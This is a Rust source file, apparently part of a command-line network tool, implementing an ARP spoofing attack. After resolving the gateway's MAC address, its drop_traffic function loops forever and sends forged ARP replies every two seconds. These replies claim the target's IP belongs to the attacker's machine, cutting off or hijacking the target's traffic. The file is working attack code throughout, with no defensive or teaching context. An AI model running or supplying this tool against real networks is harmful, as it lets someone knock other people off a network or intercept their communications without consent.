use super::error::Error;
use anyhow::Result;
use clap::Parser;
use pnet::datalink::Channel::Ethernet;
use pnet::datalink::DataLinkReceiver;
use pnet::packet::arp::{Arp, ArpOperations, ArpPacket};
use pnet::packet::ethernet::EthernetPacket;
use pnet::packet::FromPacket;
use pnet::{
    datalink::{self, DataLinkSender},
    packet::{
        arp::{ArpHardwareTypes, ArpOperation, MutableArpPacket},
        ethernet::{EtherTypes, MutableEthernetPacket},
        MutablePacket, Packet,
    },
    util::MacAddr,
};
use std::io::ErrorKind;
use std::net::{IpAddr, Ipv4Addr};

#[derive(Debug, Clone, Parser)]
pub struct Command {
    interface: u32,
    target: Ipv4Addr,
    gateway: Ipv4Addr,
}

fn send_arp_packet(
    tx: &mut dyn DataLinkSender,
    src_ip: Ipv4Addr,
    src_mac: MacAddr,
    dest_ip: Ipv4Addr,
    dest_mac: MacAddr,
    op: ArpOperation,
) -> Result<()> {
    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(op);
    arp_packet.set_sender_hw_addr(src_mac);
    arp_packet.set_sender_proto_addr(src_ip);
    arp_packet.set_target_hw_addr(dest_mac);
    arp_packet.set_target_proto_addr(dest_ip);

    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
    ethernet_packet.set_destination(dest_mac);
    ethernet_packet.set_source(src_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    ethernet_packet.set_payload(arp_packet.packet_mut());

    match tx.send_to(ethernet_packet.packet(), None) {
        Some(a) => a?,
        None => panic!(),
    };

    Ok(())
}

fn read_arp_packet(rx: &mut dyn DataLinkReceiver) -> Result<Option<Arp>> {
    match rx.next() {
        Ok(frame) => {
            let pkt = EthernetPacket::new(frame).unwrap();
            match pkt.get_ethertype() {
                EtherTypes::Arp => match ArpPacket::new(pkt.payload()) {
                    Some(arp) => Ok(Some(arp.from_packet())),
                    None => Ok(None),
                },
                _ => Ok(None),
            }
        }
        Err(e) => {
            if e.kind() == ErrorKind::TimedOut {
                Ok(None)
            } else {
                Err(e.into())
            }
        }
    }
}

fn resolve_mac(
    tx: &mut dyn DataLinkSender,
    rx: &mut dyn DataLinkReceiver,
    host_ip: Ipv4Addr,
    host_mac: MacAddr,
    target_ip: Ipv4Addr,
) -> Result<MacAddr> {
    // Send ARP request
    send_arp_packet(
        &mut *tx,
        host_ip,
        host_mac,
        target_ip,
        MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff),
        ArpOperations::Request,
    )?;
    // Wait for ARP response
    Ok(loop {
        if let Some(arp) = read_arp_packet(&mut *rx)? {
            if arp.operation == ArpOperations::Reply && arp.sender_proto_addr == target_ip {
                break arp.sender_hw_addr;
            }
        }
    })
}

impl Command {
    pub(crate) fn drop_traffic(&self) -> Result<()> {
        let interface = datalink::interfaces()
            .iter()
            .find(|interface| interface.index == self.interface)
            .cloned()
            .ok_or(Error::InvalidInterface)?;

        let host_mac = interface.mac.unwrap();
        let host_ip = match interface
            .ips
            .iter()
            .find(|ip| ip.is_ipv4())
            .ok_or(Error::NoIpv4)?
            .ip()
        {
            IpAddr::V4(ip) => ip,
            IpAddr::V6(_) => panic!("no available ipv4 addresses"),
        };

        println!("Host mac: {}\nHost IP: {}", host_mac, host_ip);

        let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!(),
            Err(e) => panic!("{}", e),
        };

        println!("Requesting gateway address...");
        let gateway_mac = resolve_mac(&mut *tx, &mut *rx, host_ip, host_mac, self.gateway)?;
        println!("Gateway mac: {}", gateway_mac);

        println!(
            "Sending packet repeatedly {} {} {} {}",
            self.target, host_mac, self.gateway, gateway_mac
        );

        // Send malicious ARP packets
        loop {
            send_arp_packet(
                &mut *tx,
                self.target,
                host_mac,
                self.gateway,
                gateway_mac,
                ArpOperations::Reply,
            )?;
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
    }
}
